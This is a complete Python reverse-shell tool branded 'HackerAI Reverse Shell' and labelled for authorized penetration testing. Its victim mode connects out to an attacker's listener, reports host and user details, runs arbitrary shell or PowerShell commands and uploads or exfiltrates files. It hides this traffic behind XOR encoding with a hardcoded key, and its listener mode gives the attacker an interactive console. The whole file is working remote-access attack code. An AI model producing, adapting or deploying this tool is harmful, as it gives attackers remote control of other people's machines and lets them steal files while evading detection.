#!/usr/bin/env python3
"""
HackerAI Reverse Shell — Authorized Penetration Testing
Zero dependencies (stdlib only)

Victim (reverse):  python3 shell.py LHOST=10.70.91.189 LPORT=4444
Listener:          python3 shell.py --listen LPORT=4444
"""

import argparse, base64, json, os, platform, shlex, shutil, signal
import socket, subprocess, sys, threading, time
from datetime import datetime
from pathlib import Path


#                                              
#  Simple XOR obfuscation (no external deps)
#                                              
class Crypt:
    def __init__(self, key: bytes = None):
        if key is None:
            key = b'H4ck3rA1_S3cr3tK3y_2026!!'
        self.key = key[:32].ljust(32, b'\x00')

    def encrypt(self, data: bytes) -> bytes:
        xored = bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(data)])
        return base64.b64encode(xored)

    def decrypt(self, data: bytes) -> bytes:
        xored = base64.b64decode(data)
        return bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(xored)])


#                                              
#  Victim shell session
#                                              
class ShellSession:
    def __init__(self, sock: socket.socket, crypt: Crypt):
        self.sock = sock
        self.crypt = crypt
        self.cwd = Path.cwd()
        self.alive = True

    def send(self, msg: str):
        payload = json.dumps({"type": "msg", "data": msg, "cwd": str(self.cwd)}).encode()
        self.sock.send(self.crypt.encrypt(payload) + b'\n')

    def recv(self) -> dict:
        buf = b''
        while b'\n' not in buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                self.alive = False
                raise ConnectionError("Connection closed")
            buf += chunk
        line, _ = buf.split(b'\n', 1)
        return json.loads(self.crypt.decrypt(line).decode())

    def run(self):
        """Main loop — execute commands from controller"""
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "user": os.environ.get("USER") or os.environ.get("USERNAME", "unknown"),
            "cwd": str(self.cwd),
        }
        self.send(f"[+] Connected  |  {json.dumps(info)}")

        while self.alive:
            try:
                msg = self.recv()
            except (ConnectionError, json.JSONDecodeError):
                break

            cmd_type = msg.get("type", "cmd")
            data = msg.get("data", "").strip()

            if cmd_type == "exit":
                self.send("[+] Goodbye.")
                break
            elif cmd_type == "cd":
                self._cd(data)
            elif cmd_type == "download":
                self._download(data)
            elif cmd_type == "upload":
                self._upload(data)
            else:
                self._exec_cmd(data)

    def _cd(self, target: str):
        target = target.strip() or "~"
        try:
            p = Path(target).expanduser().resolve()
            os.chdir(p)
            self.cwd = p
            self.send(f"[OK] cd -> {self.cwd}")
        except Exception as e:
            self.send(f"[ERR] cd: {e}")

    def _exec_cmd(self, cmd: str):
        if not cmd:
            self.send("")
            return
        try:
            if os.name == "nt":
                proc = subprocess.run(
                    ["powershell", "-Command", cmd],
                    capture_output=True, text=True, timeout=30
                )
            else:
                proc = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=30,
                    executable="/bin/bash"
                )
            out = proc.stdout + proc.stderr
            self.send(out if out else "[OK] (no output)")
        except subprocess.TimeoutExpired:
            self.send("[ERR] Command timed out (30s)")
        except Exception as e:
            self.send(f"[ERR] {e}")

    def _download(self, path: str):
        p = Path(path).expanduser()
        if not p.is_file():
            self.send(f"[ERR] Not a file: {p}")
            return
        try:
            data = p.read_bytes()
            b64 = base64.b64encode(data).decode()
            self.send(f"[FILE] {p.name} ({len(data)} bytes)")
            for i in range(0, len(b64), 4096):
                chunk = b64[i:i+4096]
                self.sock.send(self.crypt.encrypt(json.dumps({"type": "file_chunk", "data": chunk}).encode()) + b'\n')
            self.sock.send(self.crypt.encrypt(json.dumps({"type": "file_end"}).encode()) + b'\n')
        except Exception as e:
            self.send(f"[ERR] Download failed: {e}")

    def _upload(self, meta: str):
        try:
            info = json.loads(meta)
        except json.JSONDecodeError:
            self.send("[ERR] Upload meta must be JSON with 'name' and 'size'")
            return
        self.send("[UPLOAD] Ready")
        chunks = []
        while True:
            msg = self.recv()
            if msg.get("type") == "file_end":
                break
            chunks.append(msg.get("data", ""))
        raw = base64.b64decode("".join(chunks))
        dst = Path(info["name"]).expanduser()
        dst.write_bytes(raw)
        self.send(f"[OK] Uploaded {dst} ({len(raw)} bytes)")


#                                              
#  Listener / Controller
#                                              
class Controller:
    def __init__(self, sock: socket.socket, crypt: Crypt):
        self.sock = sock
        self.crypt = crypt
        self.banner = """
                                        
    HackerAI Reverse Shell v3.0         
                                        
    Commands:                           
      <shell command>                   
      cd <path>                         
      download <remote_path>            
      upload <local_path>               
      exit / quit                       
      help                              
                                        """

    def send_cmd(self, cmd_type: str, data: str):
        payload = json.dumps({"type": cmd_type, "data": data}).encode()
        self.sock.send(self.crypt.encrypt(payload) + b'\n')

    def recv_response(self) -> str:
        buf = b''
        while b'\n' not in buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                return None
            buf += chunk
        line, _ = buf.split(b'\n', 1)
        msg = json.loads(self.crypt.decrypt(line).decode())
        return msg.get("data", "")

    def interactive(self):
        print(self.banner)
        initial = self.recv_response()
        if initial:
            print(f"[remote] {initial}")

        while True:
            try:
                raw = input("shell> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self.send_cmd("exit", "")
                break

            if not raw:
                continue

            if raw.lower() in ("exit", "quit"):
                self.send_cmd("exit", "")
                break

            if raw.lower() == "help":
                print(self.banner)
                continue

            parts = shlex.split(raw)
            cmd_type = "cmd"
            data = raw

            if parts[0].lower() == "cd":
                cmd_type = "cd"
                data = " ".join(parts[1:]) if len(parts) > 1 else "~"
            elif parts[0].lower() == "download":
                cmd_type = "download"
                data = " ".join(parts[1:]) if len(parts) > 1 else ""
            elif parts[0].lower() == "upload":
                cmd_type = "upload"
                local_path = parts[1] if len(parts) > 1 else ""
                if not local_path:
                    print("[!] Usage: upload <local_file>")
                    continue
                lp = Path(local_path).expanduser()
                if not lp.is_file():
                    print(f"[!] Not found: {lp}")
                    continue
                meta = json.dumps({"name": lp.name, "size": lp.stat().st_size})
                self.send_cmd("upload", meta)
                resp = self.recv_response()
                print(f"[remote] {resp}")
                b64 = base64.b64encode(lp.read_bytes()).decode()
                for i in range(0, len(b64), 4096):
                    chunk = b64[i:i+4096]
                    enc = self.crypt.encrypt(json.dumps({"type": "file_chunk", "data": chunk}).encode())
                    self.sock.send(enc + b'\n')
                self.sock.send(self.crypt.encrypt(json.dumps({"type": "file_end"}).encode()) + b'\n')
                final = self.recv_response()
                print(f"[remote] {final}")
                continue

            self.send_cmd(cmd_type, data)
            resp = self.recv_response()
            if resp is None:
                print("[!] Connection lost")
                break
            print(resp)


#                                              
#  Socket helpers
#                                              
def create_listener(host: str, port: int) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(5)
    print(f"[*] Listening on {host}:{port}")
    print("[*] Waiting for target to connect...")
    client, addr = s.accept()
    print(f"[+] Connection from {addr}")
    return client


def connect_target(host: str, port: int) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    print(f"[*] Connecting to {host}:{port}...")
    s.connect((host, port))
    print(f"[+] Connected!")
    return s


#                                              
#  Main entry point
#                                              
def main():
    # Pre-process LHOST= / LPORT= style args BEFORE argparse
    argv_fixed = []
    for arg in sys.argv[1:]:
        upper = arg.upper()
        if upper.startswith("LHOST="):
            argv_fixed.extend(["--lhost", arg.split("=", 1)[1]])
        elif upper.startswith("LPORT="):
            argv_fixed.extend(["--lport", arg.split("=", 1)[1]])
        else:
            argv_fixed.append(arg)

    sys.argv = [sys.argv[0]] + argv_fixed

    parser = argparse.ArgumentParser(
        prog="shell.py",
        description="HackerAI Reverse Shell — Authorized Pentesting",
        usage="%(prog)s [LHOST=IP] [LPORT=PORT] [--listen] [--key HEX]",
    )
    parser.add_argument("--lhost", default="0.0.0.0", help="Listener IP")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port")
    parser.add_argument("--listen", action="store_true", help="Listener mode (attacker)")
    parser.add_argument("--key", default=None, help="XOR key in hex (16+ bytes)")
    args = parser.parse_args()

    key = bytes.fromhex(args.key) if args.key else None
    crypt = Crypt(key)

    #    LISTENER MODE (attacker machine)   
    if args.listen:
        sock = create_listener(args.lhost, args.lport)
        ctrl = Controller(sock, crypt)
        ctrl.interactive()
        sock.close()
        print("[*] Session ended.")
        return

    #    VICTIM MODE (target machine)   
    try:
        sock = connect_target(args.lhost, args.lport)
        session = ShellSession(sock, crypt)
        session.run()
    except (socket.timeout, ConnectionRefusedError) as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()